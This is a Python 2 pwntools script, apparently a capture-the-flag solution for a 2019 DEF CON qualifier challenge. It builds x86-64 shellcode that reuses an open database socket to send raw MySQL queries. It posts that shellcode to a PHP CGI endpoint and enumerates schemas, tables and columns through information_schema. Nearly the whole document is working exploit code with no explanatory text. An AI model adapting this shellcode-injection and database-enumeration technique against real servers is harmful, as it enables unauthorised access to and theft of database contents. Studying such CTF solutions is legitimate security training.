#!/usr/bin/env python2
from pwn import *
import requests
import re
import sys
import string

context.arch = "amd64"
context.os = "linux"

host = "http://shellretql.quals2019.oooverflow.io:9090/"
html = """X-Powered-By: PHP/7.0.28-0ubuntu0.16.04.1\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<html><body>Hello World!</body></html>"""

def query(_query):
    shellcode = ""
    shellcode += shellcraft.echo(p16(len(_query)) + "\x00\x00\x03" + _query , 4)
    shellcode += shellcraft.read(4, 'rsp', 200)
    shellcode += shellcraft.pushstr(html)
    shellcode += shellcraft.write(1, 'rsp', 500)

    data = {
      "shell": asm(shellcode) + "\x00"
    }

    resp = requests.post(host + "/cgi-bin/index.php", data=data)
    data = resp.text.split(delimeter)
    data = [x.split(delimeter[::-1])[0] for x in data]

    found = False
    for match in data:
        if not 'Hello World' in match and len(match) < 30:
            try:
                match = ''.join(x for x in match if x in string.printable)
                sys.stdout.write(match)
                sys.stdout.write('\n')
                sys.stdout.flush()
                found = True
            except:
                pass
    return found

#for i in xrange(100):
#    delimeter = 'scc'
#    q = "select '%s',schema_name,'%s' FROM information_schema.schemata LIMIT 1 OFFSET %i;" % (delimeter, delimeter[::-1], i)
#    query(q)

for table_name in open('table_names.txt').readlines():
    table_name = table_name.strip()
    print
    print 'Enumerating', table_name
    for i in xrange(0,25):
        delimeter = 'scc'
        q = "select '%s',CONCAT(table_name, '.', column_name),'%s' FROM information_schema.columns WHERE table_name='%s' LIMIT 1 OFFSET %i;" % (delimeter, delimeter[::-1], table_name, i)
        if not query(q):
            break
